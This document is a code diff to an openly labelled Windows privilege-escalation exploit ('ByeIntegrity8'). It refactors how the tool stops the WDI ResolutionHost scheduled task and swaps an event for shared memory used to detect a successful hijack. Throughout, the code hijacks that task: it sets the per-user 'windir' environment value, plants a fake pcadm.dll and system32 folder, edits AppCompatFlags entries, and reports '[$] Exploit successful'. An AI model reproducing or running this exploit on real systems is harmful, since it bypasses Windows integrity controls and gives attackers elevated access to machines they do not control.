@@ -61,6 +61,86 @@ typedef ULONG(WINAPI* EtwEventWriteNoRegistrationPtr)(
 	PEVENT_DATA_DESCRIPTOR userData
 );
 
+HRESULT BiStopWdiTask(
+	BOOLEAN trace
+)
+{
+	HRESULT hr;
+	ITaskService* taskService;
+	BSTR string;
+	ITaskFolder* wdiFolder = NULL;
+	IRegisteredTask* wdiTask = NULL;
+	TASK_STATE taskState;
+
+	hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
+		&IID_ITaskService, &taskService);
+	if (!SUCCEEDED(hr)) {
+		if (trace)
+			wprintf(L"CoCreateInstance() failed. HRESULT: %#010x\n", hr);
+		goto eof;
+	}
+
+	hr = taskService->lpVtbl->Connect(taskService, VARIANT_VAL, VARIANT_VAL,
+		VARIANT_VAL, VARIANT_VAL);
+	if (!SUCCEEDED(hr)) {
+		if (trace)
+			wprintf(L"ITaskService::Connect() failed. HRESULT: %#010x\n", hr);
+		goto eof;
+	}
+
+	string = SysAllocString(L"Microsoft\\Windows\\WDI");
+	if (!string) {
+		if (trace)
+			_putws(L"SysAllocString() (0) failed. No memory");
+		goto eof;
+	}
+	hr = taskService->lpVtbl->GetFolder(taskService, string, &wdiFolder);
+	SysFreeString(string);
+	if (!SUCCEEDED(hr)) {
+		if (trace)
+			wprintf(L"ITaskService::GetFolder() failed. HRESULT: %#010x\n", hr);
+		goto eof;
+	}
+
+	string = SysAllocString(L"\\ResolutionHost");
+	if (!string) {
+		if (trace)
+			_putws(L"SysAllocString() (1) failed. No memory");
+		goto eof;
+	}
+	hr = wdiFolder->lpVtbl->GetTask(wdiFolder, string, &wdiTask);
+	SysFreeString(string);
+	if (!SUCCEEDED(hr)) {
+		if (trace)
+			wprintf(L"ITaskFolder::GetTask() failed. HRESULT: %#010x\n", hr);
+		goto eof;
+	}
+
+	hr = wdiTask->lpVtbl->get_State(wdiTask, &taskState);
+	if (!SUCCEEDED(hr)) {
+		if (trace)
+			wprintf(L"IRegisteredTask::get_State() failed. HRESULT: %#010x\n", hr);
+		goto eof;
+	}
+	if (taskState == TASK_STATE_RUNNING) {
+		hr = wdiTask->lpVtbl->Stop(wdiTask, 0);
+		if (!SUCCEEDED(hr)) {
+			if (trace)
+				wprintf(L"IRegisteredTask::Stop() failed. HRESULT: %#010x\n", hr);
+			goto eof;
+		}
+	}
+
+eof:
+	if (wdiTask)
+		wdiTask->lpVtbl->Release(wdiTask);
+	if (wdiFolder)
+		wdiFolder->lpVtbl->Release(wdiFolder);
+	if (taskService)
+		taskService->lpVtbl->Release(taskService);
+	return hr;
+}
+
 int BiTriggerMain(
 	void
 )
@@ -151,6 +231,16 @@ int wmain(
 		return BiTriggerMain();
 	if (argv[0][0] == L'L')
 		return BiWndClassTriggerMain();
+	if (argv[0][0] == L'S') {
+		HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE |
+			COINIT_SPEED_OVER_MEMORY);
+		if (!SUCCEEDED(hr))
+			return (int)hr;
+		Sleep(1000);
+		hr = BiStopWdiTask(FALSE);
+		CoUninitialize();
+		return (int)hr;
+	}
 
 	int exitCode = EXIT_FAILURE;
 	WCHAR cmdLine[2];
@@ -159,21 +249,17 @@ int wmain(
 	HRSRC resource;
 	HGLOBAL loadedResource;
 	LPVOID payload;
-	HANDLE hPayload, hEvent = NULL;
+	HANDLE hPayload, hSharedMem = NULL;
 	BOOLEAN createdSystemFake = FALSE, createdPayload = FALSE, comReady = FALSE;
 	DWORD writtenBytes;
-	BSTR string;
 	HRESULT hr;
-	ITaskService* taskService = NULL;
-	ITaskFolder* wdiFolder = NULL;
-	IRegisteredTask* wdiTask = NULL;
-	TASK_STATE taskState;
 	HMODULE pcaModule = NULL;
 	PcaMonitorProcessPtr PcaMonitorProcess = NULL; //fixme; 4703 without initialization for some reason...
 	DWORD curDirSize;
 	PWSTR curDir;
 	LSTATUS status;
-	BOOLEAN taskHijacked, usesPca = TRUE;
+	BOOLEAN taskHijacked = FALSE, usesPca = TRUE;
+	PUCHAR pSharedMem = NULL;
 
 	if (*(PULONG)0x7FFE026C == 6 && *(PULONG)0x7FFE0270 < 3) {
 		cmdLine[0] = L'L';
@@ -227,57 +313,8 @@ int wmain(
 	}
 	CloseHandle(hPayload);
 
-	hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
-		&IID_ITaskService, &taskService);
-	if (!SUCCEEDED(hr)) {
-		wprintf(L"CoCreateInstance() failed. HRESULT: %#010x\n", hr);
+	if (!SUCCEEDED(BiStopWdiTask(TRUE)))
 		goto eof;
-	}
-	comReady = TRUE;
-
-	hr = taskService->lpVtbl->Connect(taskService, VARIANT_VAL, VARIANT_VAL,
-		VARIANT_VAL, VARIANT_VAL);
-	if (!SUCCEEDED(hr)) {
-		wprintf(L"ITaskService::Connect() failed. HRESULT: %#010x\n", hr);
-		goto eof;
-	}
-
-	string = SysAllocString(L"Microsoft\\Windows\\WDI");
-	if (!string) {
-		_putws(L"SysAllocString() (0) failed. No memory");
-		goto eof;
-	}
-	hr = taskService->lpVtbl->GetFolder(taskService, string, &wdiFolder);
-	SysFreeString(string);
-	if (!SUCCEEDED(hr)) {
-		wprintf(L"ITaskService::GetFolder() failed. HRESULT: %#010x\n", hr);
-		goto eof;
-	}
-
-	string = SysAllocString(L"\\ResolutionHost");
-	if (!string) {
-		_putws(L"SysAllocString() (1) failed. No memory");
-		goto eof;
-	}
-	hr = wdiFolder->lpVtbl->GetTask(wdiFolder, string, &wdiTask);
-	SysFreeString(string);
-	if (!SUCCEEDED(hr)) {
-		wprintf(L"ITaskFolder::GetTask() failed. HRESULT: %#010x\n", hr);
-		goto eof;
-	}
-
-	hr = wdiTask->lpVtbl->get_State(wdiTask, &taskState);
-	if (!SUCCEEDED(hr)) {
-		wprintf(L"IRegisteredTask::get_State() failed. HRESULT: %#010x\n", hr);
-		goto eof;
-	}
-	if (taskState == TASK_STATE_RUNNING) {
-		hr = wdiTask->lpVtbl->Stop(wdiTask, 0);
-		if (!SUCCEEDED(hr)) {
-			wprintf(L"IRegisteredTask::Stop() failed. HRESULT: %#010x\n", hr);
-			goto eof;
-		}
-	}
 
 	if (usesPca) {
 		pcaModule = LoadLibraryExW(L"pcacli.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
@@ -300,12 +337,21 @@ int wmain(
 		goto eof;
 	}
 
-	hEvent = CreateEventW(NULL, FALSE, FALSE, L"ByeIntegrity8");
-	if (!hEvent) {
+	hSharedMem = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
+		0, ((wcslen(argv[0]) + 1) * sizeof(WCHAR)) + sizeof(BOOLEAN), L"ByeIntegrity8");
+	if (!hSharedMem) {
 		HeapFree(GetProcessHeap(), 0, curDir);
-		wprintf(L"CreateEventW() failed. Error: %lu\n", GetLastError());
+		wprintf(L"CreateFileMappingW() failed. Error: %lu\n", GetLastError());
 		goto eof;
 	}
+
+	pSharedMem = MapViewOfFile(hSharedMem, FILE_MAP_WRITE, 0, 0, 0);
+	if (!pSharedMem) {
+		HeapFree(GetProcessHeap(), 0, curDir);
+		wprintf(L"MapViewOfFile() failed. Error: %lu\n", GetLastError());
+		goto eof;
+	}
+	memcpy(pSharedMem + sizeof(BOOLEAN), argv[0], (wcslen(argv[0]) + 1) * sizeof(WCHAR));
 
 	status = RegSetKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir", REG_SZ, curDir,
 		curDirSize * sizeof(WCHAR));
@@ -333,6 +379,7 @@ int wmain(
 		status = 0;
 	HeapFree(GetProcessHeap(), 0, curDir);
 	if (status) {
+		TerminateProcess(processInfo.hProcess, 0);
 		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
 		wprintf(L"PcaMonitorProcess() failed. Error: %lu\n", (DWORD)status);
 		goto eof;
@@ -343,20 +390,22 @@ int wmain(
 	if (usesPca) {
 		GetExitCodeProcess(processInfo.hProcess, &curDirSize);
 		if (curDirSize) {
-			RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
 			wprintf(L"Trigger process exited with error code: %lu\n", curDirSize);
-			goto eof;
+			goto eofEarly;
 		}
 	}
 
-	taskHijacked = FALSE;
-	if (WaitForSingleObject(hEvent, 20000) == WAIT_TIMEOUT) {
-		wdiTask->lpVtbl->get_LastTaskResult(wdiTask, &hr);
-		wprintf(L"Diagnostic module task did not launch & exit properly. HRESULT: %#010x\n", hr);
+	for (int i = 0; i <= 2000; ++i) {
+		if (*(PBOOLEAN)pSharedMem == TRUE) {
+			taskHijacked = TRUE;
+			break;
+		}
+		Sleep(10);
 	}
-	else
-		taskHijacked = TRUE;
+	if (!taskHijacked)
+		wprintf(L"Diagnostic module task did not launch & exit properly. HRESULT: %#010x\n", hr);
 
+eofEarly:
 	RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
 	if (!usesPca) {
 		RegDeleteKeyValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers",
@@ -372,23 +421,19 @@ int wmain(
 		_putws(L"[$] Exploit successful\n");
 		exitCode = 0;
 	}
-	Sleep(1000); // allow taskhostw.exe to end so we can cleanup fake pcadm.dll & system32 directory
+	Sleep(2500); // allow taskhostw.exe to end so we can cleanup fake pcadm.dll & system32 directory
 
 eof:
 	if (processInfo.hThread)
 		CloseHandle(processInfo.hThread);
 	if (processInfo.hProcess)
 		CloseHandle(processInfo.hProcess);
-	if (hEvent)
-		CloseHandle(hEvent);
+	if (pSharedMem)
+		UnmapViewOfFile(pSharedMem);
+	if (hSharedMem)
+		CloseHandle(hSharedMem);
 	if (pcaModule)
 		FreeLibrary(pcaModule);
-	if (wdiTask)
-		wdiTask->lpVtbl->Release(wdiTask);
-	if (wdiFolder)
-		wdiFolder->lpVtbl->Release(wdiFolder);
-	if (taskService)
-		taskService->lpVtbl->Release(taskService);
 	if (comReady)
 		CoUninitialize();
 	if (createdPayload)
